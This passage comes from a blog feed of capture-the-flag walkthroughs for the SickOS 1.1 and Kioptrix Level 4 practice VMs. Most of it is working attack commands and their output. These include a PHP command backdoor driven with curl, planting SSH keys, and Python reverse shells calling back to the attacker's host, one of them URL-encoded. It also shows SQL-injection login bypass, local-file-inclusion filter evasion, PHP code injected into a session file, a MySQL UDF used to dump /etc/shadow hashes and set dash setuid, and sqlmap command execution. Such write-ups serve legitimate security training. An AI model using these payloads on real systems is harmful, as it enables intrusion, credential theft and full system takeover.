-rw-r&ndash;r&ndash;  1 root root   45 Dec  5 06:05 robots.txt
drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms</p>

<p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh</a>&rdquo;
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data</a>&rdquo;
total 28
drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
-rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
-rw-r&ndash;r&ndash;  1 root     root       21 Dec  5 06:05 index.php
-rw-r&ndash;r&ndash;  1 root     root       45 Dec  5 06:05 robots.txt
drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms
{% endcodeblock %}</p>

<p>Creating ssh keypair:
{% codeblock %}
root@kali32:~$ ssh-keygen -P &ldquo;&rdquo; -f blabla
Generating public/private rsa key pair.
Your identification has been saved in blabla.
Your public key has been saved in blabla.pub.
The key fingerprint is:
4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
The key&rsquo;s randomart image is:
+&mdash;[RSA 2048]&mdash;-+
|          o     .|
|           + E + |
|          o   . +|
|         o . . o+|
|        S . o o.o|
|           . + o |
|          . * + o|
|           + = ..|
|            ..o. |
+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>

<p>root@kali32:~$ cat blabla.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32
{% endcodeblock %}</p>

<p>To encode <code>+</code> characters, otherwise they are interpreted as spaces in url:
{% codeblock %}
root@kali32:~$ cat blabla.pub  | sed &rsquo;s#+#%2b#g&#8217;
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32
{% endcodeblock %}</p>

<p>To store public key as <code>authorized_keys</code>:
{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+</a>&lsquo;ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX&rsquo;>~www-data/.ssh/authorized_keys&rdquo;
{% endcodeblock %}</p>

<p>We verify the successful upload:
{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys</a>&rdquo;
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX
{% endcodeblock %}</p>

<p>It does not work, the server is still asking password, even when we try to set more restricted permission:
{% codeblock %}
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys</a>&rdquo;
root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh</a>&rdquo;</p>

<p>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
<a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#119;&#119;&#x77;&#x2d;&#100;&#x61;&#x74;&#x61;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#56;&#x30;&#x2e;&#49;&#x36;&#57;">&#119;&#x77;&#x77;&#x2d;&#x64;&#x61;&#116;&#x61;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x38;&#48;&#46;&#x31;&#54;&#x39;</a>&rsquo;s password:
{% endcodeblock %}</p>

<p>We come back to this later. Trying different payload, we encode the following
command and invoke via our backdoor, the second output is ascii encoded using
Burp Encoder:
{% codeblock lang:python %}
python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1400
{% endcodeblock %}</p>

<p>{% codeblock %}
%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30
{% endcodeblock %}</p>

<p>This is how we got the remote shell:
{% codeblock %}
root@kali32:~$ nc -l -p 1400</p>

<p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30">http://192.168.80.169/wolfcms/public/a.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30</a>&rdquo;
{% endcodeblock %}</p>

<p>We connect to MySQL again, this time we noticed that there is user <code>sickos</code> with the same password as mysql <code>root</code>, that is <code>john@123</code>.</p>

<p>{% codeblock %}
www-data@SickOs:/etc/mysql$ mysql -uroot -pjohn@123 mysql
mysql -uroot -pjohn@123 mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A</p>

<p>Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 165
Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)</p>

<p>Copyright &copy; 2000, 2015, Oracle and/or its affiliates. All rights reserved.</p>

<p>Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>mysql> SELECT User,Host,Password FROM mysql.user;
SELECT User,Host,Password FROM mysql.user;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| User             | Host      | Password                                  |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
| root             | localhost | <em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
| root             | sickos    | </em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
| root             | 127.0.0.1 | <em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
| root             | ::1       | </em>A7A20B93EC076311A63BF86B5C705B25C054DD77 |
| debian-sys-maint | localhost | *CB98094782C386F2459D65D97B17D1DE15D1654B |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
5 rows in set (0.00 sec)
{% endcodeblock %}</p>

<p>His shell uses the same password and we can easily escalate to uid 0.</p>

<p>{% codeblock %}
www-data@SickOs:/var/www/wolfcms/public$ su sickos
su sickos
Password: john@123</p>

<p>sickos@SickOs:/var/www/wolfcms/public$</p>

<p>sickos@SickOs:/var/www/wolfcms/public$ sudo -l
sudo -l
[sudo] password for sickos: john@123</p>

<p>Matching Defaults entries for sickos on this host:
    env_reset,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>

<p>User sickos may run the following commands on this host:
    (ALL : ALL) ALL
sickos@SickOs:/var/www/wolfcms/public$ sudo su
sudo su</p>

<p>root@SickOs:/var/www/wolfcms/public# cd /root
cd /root
root@SickOs:~# ls -la
ls -la
total 40
drwx&mdash;&mdash;  3 root root 4096 Dec  6 21:14 .
drwxr-xr-x 22 root root 4096 Sep 22 08:13 ..
-rw-r&ndash;r&ndash;  1 root root   96 Dec  6 07:27 a0216ea4d51874464078c618298b1367.txt
-rw&mdash;&mdash;-  1 root root 3724 Dec  6 21:18 .bash_history
-rw-r&ndash;r&ndash;  1 root root 3106 Apr 19  2012 .bashrc
drwx&mdash;&mdash;  2 root root 4096 Sep 22 08:33 .cache
-rw&mdash;&mdash;-  1 root root   22 Dec  5 06:24 .mysql_history
-rw-r&ndash;r&ndash;  1 root root  140 Apr 19  2012 .profile
-rw&mdash;&mdash;-  1 root root 5230 Dec  6 21:14 .viminfo
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!</p>

<p>ROOT!</p>

<p>You have Succesfully completed SickOS1.1.
Thanks for Trying
{% endcodeblock %}</p>

<p>Reading the <code>auth.log</code>, we also found out the reason why ssh did not worked:
{% codeblock %}
Dec 12 15:36:27 SickOs sshd[3533]: Authentication refused: bad ownership or modes for directory /var/www
{% endcodeblock %}</p>

<p>Unfortunately our user could not change this permission.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix: Level 4]]></title>
    <link href="http://73696e65.github.io/blog/2015/08/25/kioptrix-level-4/"/>
    <updated>2015-08-25T18:18:32+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/08/25/kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/#">Kioptrix: Level 1.3 (#4)</a></p>

<p>Nmap output:
{% codeblock %}
root@kali32:~# nmap 192.168.80.154 -sT</p>

<p>Starting Nmap 6.49BETA4 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2015-04-26 23:39 CEST
Nmap scan report for 192.168.80.154
Host is up (0.0015s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:53:2F:A3 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
{% endcodeblock %}</p>

<p>There is a member login on the <a href="http://192.168.80.154/index.php">http://192.168.80.154/index.php</a> site, we try the
following credentials (SQLi):</p>

<p>{% codeblock %}
Username: Administrator
Password: test&#8217; or &lsquo;1&rsquo;=&lsquo;1
{% endcodeblock %}</p>

<p>We logged into member site and after a few seconds found the local file
inclusion vulnerability. Filtering the <code>etc</code> string could be easily evaded for displaying <code>/etc/passwd</code>:</p>

<p>{% codeblock %}
<a href="http://192.168.80.154/member.php?username=robert">http://192.168.80.154/member.php?username=robert</a>
<a href="http://192.168.80.154/member.php?username=../../../../../etc/passwd">http://192.168.80.154/member.php?username=../../../../../etc/passwd</a> -> User ../../../../..//passwd
<a href="http://192.168.80.154/member.php?username=../../../../../eetct/passwd">http://192.168.80.154/member.php?username=../../../../../eetct/passwd</a> -> User ../../../../../et/passwd
<a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd</a> -> /../../../../../etc/passwd.php
<a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00</a>
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# curl &ldquo;<a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00</a>&rdquo;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/kshell
robert:x:1002:1002:,,,:/home/robert:/bin/kshell
{% endcodeblock %}</p>

<p><code>smbmap</code> output reveals:
{% codeblock %}
root@kali32:~# smbmap -H 192.168.80.154
[+] Finding open SMB ports&hellip;.
[+] User SMB session establishd on 192.168.80.154&hellip;
[+] IP: 192.168.80.154:445  Name: 192.168.80.154
    Disk                                                    Permissions
    &mdash;-                                                    &mdash;&mdash;&mdash;&ndash;
    print$                                              NO ACCESS
    IPC$                                                NO ACCESS
{% endcodeblock %}</p>

<p>Now we try to inject php backdoor. For this purpose, we use our session file.
The file has a fixed location <code>/var/lib/php5/sess_</code> with the appended session
cookie name:
{% codeblock %}
<a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00</a></p>

<p>myusername|s:13:&ldquo;Administrator&rdquo;;mypassword|s:15:&ldquo;test&#8217; or &lsquo;1&rsquo;=&lsquo;1&rdquo;;
{% endcodeblock %}</p>

<p>As we can see, the myusername session variable could be used to easily inject our code:</p>

<p>We need to login using these credentials:
{% codeblock %}
Username: &lt;?php system($_REQUEST[cmd]); ?>
Password: test&#8217; or &lsquo;1&rsquo;=&lsquo;1
{% endcodeblock %}</p>

<p>Now we have a backdoor, that uses parameter <code>cmd</code>. Digging deeper, we use python to execute reverse shell:
{% codeblock %}
root@kali32:~# curl &ldquo;<a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=id">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=id</a>&rdquo;
myusername|s:32:&ldquo;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&rdquo;;mypassword|s:15:&ldquo;test&#8217; or &lsquo;1&rsquo;=&lsquo;1&rdquo;;</p>

<p>root@kali32:~# curl &ldquo;<a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=cat%20database.sql">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=cat%20database.sql</a>&rdquo;
myusername|s:32:&ldquo;CREATE TABLE <code>members</code> (
<code>id</code> int(4) NOT NULL auto_increment,
<code>username</code> varchar(65) NOT NULL default &lsquo;&rsquo;,
<code>password</code> varchar(65) NOT NULL default &lsquo;&rsquo;,
PRIMARY KEY (<code>id</code>)
) TYPE=MyISAM AUTO_INCREMENT=2 ;</p>

<p>&ndash;</p>

<h2>&ndash; Dumping data for table <code>members</code></h2>

<p>INSERT INTO <code>members</code> VALUES (1, &lsquo;john&rsquo;, &lsquo;1234&rsquo;);
&ldquo;;mypassword|s:15:&#8221;test&#8217; or &lsquo;1&rsquo;=&lsquo;1&rdquo;;</p>

<p>root@kali32:/var/www/html# nc -l -p 1234
/bin/sh: can&rsquo;t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>

<p>root@kali32:~# curl &ldquo;<a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=python+-c+">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=python+-c+</a>&lsquo;import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.80.137\&rdquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&ldquo;/bin/sh\&rdquo;,\&ldquo;-i\&rdquo;]);&rsquo;&#8221;</p>

<p>$ cat checklogin.php
&lt;?php
ob_start();
$host=&ldquo;localhost&rdquo;; // Host name
$username=&ldquo;root&rdquo;; // Mysql username
$password=&ldquo;&rdquo;; // Mysql password
$db_name=&ldquo;members&rdquo;; // Database name
$tbl_name=&ldquo;members&rdquo;; // Table name</p>

<p>// Connect to server and select databse.
mysql_connect(&ldquo;$host&rdquo;, &ldquo;$username&rdquo;, &ldquo;$password&rdquo;)or die(&ldquo;cannot connect&rdquo;);
mysql_select_db(&ldquo;$db_name&rdquo;)or die(&ldquo;cannot select DB&rdquo;);</p>

<p>// Define $myusername and $mypassword
$myusername=$<em>POST[&lsquo;myusername&rsquo;];
$mypassword=$</em>POST[&lsquo;mypassword&rsquo;];</p>

<p>// To protect MySQL injection (more detail about MySQL injection)
$myusername = stripslashes($myusername);
//$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
//$mypassword = mysql_real_escape_string($mypassword);</p>

<p>//$sql=&ldquo;SELECT * FROM $tbl_name WHERE username=&lsquo;$myusername&rsquo; and password=&lsquo;$mypassword&rsquo;&rdquo;;
$result=mysql_query(&ldquo;SELECT * FROM $tbl_name WHERE username=&lsquo;$myusername&rsquo; and password=&lsquo;$mypassword&rsquo;&rdquo;);
//$result=mysql_query($sql);</p>

<p>// Mysql_num_row is counting table row
$count=mysql_num_rows($result);
// If result matched $myusername and $mypassword, table row must be 1 row</p>

<p>if($count!=0){
// Register $myusername, $mypassword and redirect to file &ldquo;login_success.php&rdquo;
    session_register(&ldquo;myusername&rdquo;);
    session_register(&ldquo;mypassword&rdquo;);
    header(&ldquo;location:login_success.php?username=$myusername&rdquo;);
}
else {
echo &ldquo;Wrong Username or Password&rdquo;;
print(&lsquo;<form method="link" action="index.php"><input type=submit value="Try Again"></form>&rsquo;);
}</p>

<p>ob_end_flush();
?>
{% endcodeblock %}</p>

<p>Because the mysql instance is running as root user, we have a full access to
the database. We dump it and use the credentials for ssh login, for example
with the user <code>john</code>. The <code>lshell</code> is executed, but noticing his <code>.lhistory</code> file,
bash could be directly executed too. Finally, we set the suid privileges for
<code>dash</code> using mysql and obtain the root privileges:</p>

<p>{% codeblock %}
$ echo &ldquo;select * from members&rdquo; | mysql -u root members
id  username    password
1   john    MyNameIsJohn
2   robert  ADGAdsafdfwt4gadfga==</p>

<p>$ cat /home/john/.lhistory
?
help
echo os.system(&lsquo;/bin/bash&rsquo;)
exit
su
sudo
?
scp
touch hello
help
ls /root
exit
echo os.system(&lsquo;/bin/bash&rsquo;)
exit</p>

<p>root@kali32:~# ssh -l john 192.168.80.154
<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#106;&#111;&#x68;&#x6e;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x38;&#48;&#46;&#49;&#x35;&#x34;">&#106;&#x6f;&#x68;&#x6e;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#56;&#48;&#46;&#49;&#x35;&#x34;</a>&rsquo;s password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don&rsquo;t screw up
Type &lsquo;?&rsquo; or &lsquo;help&rsquo; to get the list of allowed commands
john:~$ echo os.system(&lsquo;/bin/bash&rsquo;)
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)</p>

<p>john:~$ mysql -u root</p>

<p>mysql> select sys_exec(&lsquo;cat /etc/shadow > /tmp/a&rsquo;);
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| sys_exec(&lsquo;cat /etc/shadow > /tmp/a&rsquo;) |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| NULL                                 |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
1 row in set (0.01 sec)</p>

<p>mysql>
[1]+  Stopped                 mysql -u root
john@Kioptrix4:~$ cat /tmp/a
root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
daemon:<em>:15374:0:99999:7:::
bin:</em>:15374:0:99999:7:::
sys:<em>:15374:0:99999:7:::
sync:</em>:15374:0:99999:7:::
games:<em>:15374:0:99999:7:::
man:</em>:15374:0:99999:7:::
lp:<em>:15374:0:99999:7:::
mail:</em>:15374:0:99999:7:::
<a href="news:*:15374:0:99999:7:::">news:*:15374:0:99999:7:::</a>
uucp:<em>:15374:0:99999:7:::
proxy:</em>:15374:0:99999:7:::
www-data:<em>:15374:0:99999:7:::
backup:</em>:15374:0:99999:7:::
list:<em>:15374:0:99999:7:::
irc:</em>:15374:0:99999:7:::
gnats:<em>:15374:0:99999:7:::
nobody:</em>:15374:0:99999:7:::
libuuid:!:15374:0:99999:7:::
dhcp:<em>:15374:0:99999:7:::
syslog:</em>:15374:0:99999:7:::
klog:<em>:15374:0:99999:7:::
mysql:!:15374:0:99999:7:::
sshd:</em>:15374:0:99999:7:::
loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
john@Kioptrix4:/etc/samba$</p>

<p>mysql> select sys_exec(&lsquo;chmod +s /bin/dash&rsquo;);
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| sys_exec(&lsquo;chmod +s /bin/dash&rsquo;) |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| NULL                           |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
1 row in set (0.01 sec)</p>

<p>john@Kioptrix4:~$ /bin/dash</p>

<h1>id</h1>

<p>uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) groups=1001(john)</p>

<h1>cd /root</h1>

<h1>cat congrats.txt</h1>

<p>Congratulations!
You&rsquo;ve got root.</p>

<p>There is more then one way to get root on this system. Try and find them.
I&rsquo;ve only tested two (2) methods, but it doesn&rsquo;t mean there aren&rsquo;t more.
As always there&rsquo;s an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.</p>

<p>It took a while to make this. For one it&rsquo;s not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.</p>

<p>If you haven&rsquo;t already, check out the other VMs available on:
www.kioptrix.com</p>

<p>Thanks for playing,
loneferret
{% endcodeblock %}</p>

<p>Because the UDF exploitation is well known for sqlmap, we could solve the challenge also using this tool:</p>

<p>{% codeblock %}
root@kali32:~# sqlmap -u <a href="http://192.168.80.154/checklogin.php">http://192.168.80.154/checklogin.php</a> &ndash;data=&ldquo;myusername=a&amp;mypassword=a&amp;Submit=Login&rdquo; &ndash;os-cmd &lsquo;id&rsquo; &ndash;batch | grep uid
command standard output:    &lsquo;uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)&rsquo;</p>

